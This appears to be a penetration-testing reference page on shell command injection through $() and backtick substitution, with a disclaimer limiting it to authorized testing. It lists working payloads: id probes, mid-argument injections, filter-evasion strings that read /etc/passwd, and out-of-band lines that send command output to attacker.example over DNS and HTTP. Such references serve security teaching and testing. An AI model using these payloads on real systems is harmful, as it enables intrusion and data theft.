---
title: "Command substitution with $() and backticks"
description: "Using $(...) and backtick command substitution to run a nested command and splice its output into the current command line, working even when the injection point is mid-argument."
keywords:
  - command injection
  - command substitution
  - backticks
  - dollar-paren
  - inline command execution
  - shell injection
---

# Command substitution (`$(...)` and backticks)

Command substitution runs a nested command and **replaces the expression with its standard output**, inline, before the outer command runs. The two forms, `$(cmd)` and `` `cmd` ``, do the same thing. Because substitution is expanded *inside* the existing command line, it fires even when your input lands in the **middle of an argument**—where a separator like `;` would not yet terminate the command.

> **Scope.** For authorized penetration tests, red-team engagements, CTF labs, and code review of systems you own or are contracted to assess. Executing commands without written authorization is unlawful.

## Mechanism

The shell evaluates `$(...)` and backticks during expansion, substituting the captured output into the surrounding line. Given `ping -c 1 <host>`:

```
127.0.0.1$(id)
127.0.0.1`id`
```

The shell runs `id`, then builds the final argument from `127.0.0.1` plus the output. `ping` receives a garbage host and fails, but `id` has already executed. This is why substitution is the preferred **first probe**: it does not depend on terminating the outer command, and a reflected `uid=...` cleanly distinguishes real execution from mere reflection.

## Mid-argument injection

Separators need to sit at a statement boundary. Substitution does not—it expands wherever it appears, so it survives inside quotes and in the middle of a token:

```
# double-quoted sink: ping -c 1 "$host"
"$(id)"                     # expands inside the quotes, no break-out needed
file_$(whoami)_name         # embedded in a longer argument
http://site/$(id).png       # inside a URL-shaped value
```

This makes `$(...)` effective against sinks where the value is wrapped or decorated by surrounding text that a `;` payload would leave syntactically broken.

## Nesting and composition

Substitutions nest, letting you build arguments from several commands:

```
$(curl http://10.0.0.1/$(whoami))
`echo $(id|base64)`
```

## Blind out-of-band use

When output is not reflected, splice command output into a hostname so it leaves via DNS/HTTP to a server you control—confirmation and exfiltration in one:

```
127.0.0.1; nslookup $(whoami).OOB_ID.attacker.example
127.0.0.1; curl http://OOB_ID.attacker.example/$(id | base64 -w0)
```

The nested command's output becomes the subdomain label, captured by an interaction server (Burp Collaborator, `interactsh`).

## Filter evasion

Substitution combines with the usual space- and keyword-evasion tricks:

```
$(cat${IFS}/etc/passwd)
$(cat$IFS/etc/passwd)
`cat</etc/passwd`
$(/???/c?t /???/p?sswd)        # globbing to avoid literal keywords
```

## Platform note

`$(...)` and backticks are **POSIX/bash** constructs. Windows `cmd.exe` has no equivalent—use `%VAR%` expansion and `for /f` instead, or shift to PowerShell, where `$(...)` is the substitution operator (`ping 127.0.0.1; $(whoami)`).

## References

- [OWASP: OS Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [PortSwigger Web Security Academy: OS command injection](https://portswigger.net/web-security/os-command-injection)
- [PayloadsAllTheThings: Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
